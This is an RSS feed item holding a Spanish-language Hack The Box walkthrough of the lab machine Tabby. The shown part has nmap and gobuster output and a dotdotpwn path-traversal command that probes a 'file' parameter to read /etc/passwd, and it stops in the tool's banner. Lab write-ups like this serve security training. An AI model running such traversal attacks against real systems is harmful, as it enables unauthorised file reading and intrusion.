<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" 
  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
  xmlns:dc="http://purl.org/dc/elements/1.1/" 
  xmlns:atom="http://www.w3.org/2005/Atom" 
  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
  xmlns:media="http://search.yahoo.com/mrss/">
  <channel>
    <title>dotdotpwn on sckull</title>
    <link>https://sckull.github.io/tags/dotdotpwn/</link>
    <description>Recent content in dotdotpwn on sckull</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>es</language>
    <copyright>©{year}, All Rights Reserved</copyright>
    <lastBuildDate>Mon, 07 Dec 2020 00:00:00 +0000</lastBuildDate>
    <sy:updatePeriod>daily</sy:updatePeriod>
    <sy:updateFrequency>daily</sy:updateFrequency>
    
        <atom:link href="https://sckull.github.io/tags/dotdotpwn/index.xml" rel="self" type="application/rss+xml" />
    
    
    

      
      <item>
        <title>Hack The Box - Tabby</title>
        <link>https://sckull.github.io/posts/tabby/</link>
        <pubDate>Mon, 07 Dec 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Mon, 07 Dec 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/tabby/</guid>
        <description>En Tabby descubrimos una vulnerabilidad LFI y, que con DotDotPwn logramos obtener la direccion o payload para leer documentos lo que nos llevo a leer las credenciales de Tomcat, con este ultimo logramos subir un Payload para obtener una shell inversa utilizando Curl.</description>
        <content:encoded>



  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/tabby/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;p&gt;En Tabby descubrimos una vulnerabilidad LFI y, que con DotDotPwn logramos obtener la direccion o payload para leer documentos lo que nos llevo a leer las credenciales de Tomcat, con este ultimo logramos subir un Payload para obtener una shell inversa utilizando Curl. Crackeamos con Fcrackzip un archiv zip lo que nos dio acceso a un segundo usuario. Escalamos privilegios creando un contenedor privilegiado utilizando LXC.&lt;/p&gt;
&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/machines/profile/259&#34;&gt;Tabby&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,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&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;OS&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Linux&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;20&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;IP&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;10.10.10.194&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_maker&#34; style=&#34;margin: auto;&#34;&gt; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/1190&#34;&gt;egre55&lt;/a&gt;&lt;img src=&#34;https://www.hackthebox.eu/badge/image/1190&#34; class=&#34;img_user_maker&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;a href=&#34;#single__title&#34; class=&#34;button&#34; style=&#34;width: 72px; height: 30px; pointer-events: none;&#34;  data-color=&#34;default&#34; target=&#34;_blank&#34; rel=&#34;noreferrer&#34;&gt;
  &lt;span class=&#34;button__text&#34;&gt;
    Matrix
  &lt;/span&gt;
&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;div class=&#34;box&#34;&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-chart&#34; data-lang=&#34;chart&#34;&gt;{
   &amp;quot;type&amp;quot;:&amp;quot;radar&amp;quot;,
   &amp;quot;data&amp;quot;:{
      &amp;quot;labels&amp;quot;:[&amp;quot;Enumeration&amp;quot;,&amp;quot;Real-Life&amp;quot;,&amp;quot;CVE&amp;quot;,&amp;quot;Custom Explotation&amp;quot;,&amp;quot;CTF-Like&amp;quot;],
      &amp;quot;datasets&amp;quot;:[
         {
            &amp;quot;label&amp;quot;:&amp;quot;User Rate&amp;quot;,  &amp;quot;data&amp;quot;:[6.9, 6.5, 6.4, 3.6, 3.5],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(75, 162, 189,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#4ba2bd&amp;quot;
         },
         { 
            &amp;quot;label&amp;quot;:&amp;quot;Maker Rate&amp;quot;,
            &amp;quot;data&amp;quot;:[8, 9, 9, 1, 1],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(154, 204, 20,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#9acc14&amp;quot;
         }
      ]
   },
    &amp;quot;options&amp;quot;: {&amp;quot;scale&amp;quot;: {&amp;quot;ticks&amp;quot;: {&amp;quot;backdropColor&amp;quot;:&amp;quot;rgba(0,0,0,0)&amp;quot;},
            &amp;quot;angleLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;},
            &amp;quot;gridLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;}
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;nmap&#34;&gt;NMAP&lt;/h1&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto http tomcat (8080), http (80) y el puerto ssh (22) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Thu Sep 24 01:03:09 2020 as: nmap -p- --min-rate 1000 -o allports 10.10.10.194&lt;/span&gt;
Warning: 10.10.10.194 giving up on port because retransmission cap hit &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.194 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.10.194&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.13s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;64652&lt;/span&gt; closed ports, &lt;span class=&#34;m&#34;&gt;880&lt;/span&gt; filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

&lt;span class=&#34;c1&#34;&gt;# Nmap done at Thu Sep 24 01:05:44 2020 -- 1 IP address (1 host up) scanned in 154.47 seconds&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Thu Sep 24 01:06:26 2020 as: nmap -p22,80,8080 -sC -sV -o serviceports 10.10.10.194&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.194 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.10.194&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.068s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp   open  http    Apache httpd 2.4.41 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.41 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-open-proxy: Proxy might be redirecting requests
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Apache Tomcat
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Thu Sep 24 01:06:41 2020 -- 1 IP address (1 host up) scanned in 15.55 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;http&#34;&gt;HTTP&lt;/h1&gt;
&lt;p&gt;Encontramos una pagina web en el puerto 80 que ofrece servicios de hosting.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/tabby/Screenshot_2.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;kali@kali:~/htb/tabby$ gobuster dir -u http://10.10.10.194/ -w /usr/share/wordlists/dirb/common.txt -q -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -x php,html,txt
/assets &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/favicon.ico &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/files &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/news.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/Readme.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Las direcciones que encontramos no tienen algo que nos pudiera ayudar pero, al revisar el codigo fuente de la pagina principal vemos que el boton &lt;code&gt;News&lt;/code&gt; en el nav, nos redirige hacia otra pagina con el dominio &lt;code&gt;megahosting.htb&lt;/code&gt; el cual agregamos a nuestro archivo &lt;code&gt;/etc/hosts&lt;/code&gt; a la IP de la maquina. Regresamos nuevamente a la pagina y vemos que la URL se le pasa un archivo (&lt;code&gt;?file=statement&lt;/code&gt;), posiblemente tenga una vulnerabilidad de LFI.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/tabby/Screenshot_3.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;dotdotpwn---lfi&#34;&gt;DOTDOTPWN - LFI&lt;/h1&gt;
&lt;p&gt;Utilizamos la herramienta dotdotpwn la cual nos ayudo a identificar la vulnerabilidad LFI en la pagina.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;kali@kali:~/htb/tabby$ dotdotpwn -m http-url -u http://megahosting.htb/news.php?file&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;TRAVERSAL -k &lt;span class=&#34;s2&#34;&gt;&amp;#34;root:&amp;#34;&lt;/span&gt; -t .2 -q
&lt;span class=&#34;c1&#34;&gt;#################################################################################&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#                                                                               #&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#  CubilFelino                                                       Chatsubo   #&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#  Security Research Lab              and            [(in)Security Dark] Labs   #&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#  chr1x.sectester.net                             chatsubo-labs.blogspot.com   #&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#                                                                               #&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#                               pr0udly present:                                #&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#                                                                               #&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#  ________            __  ________            __  __________                   #&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#  \______ \    ____ _/  |_\______ \    ____ _/  |_\______   \__  _  __ ____    #&lt;/span&gt;
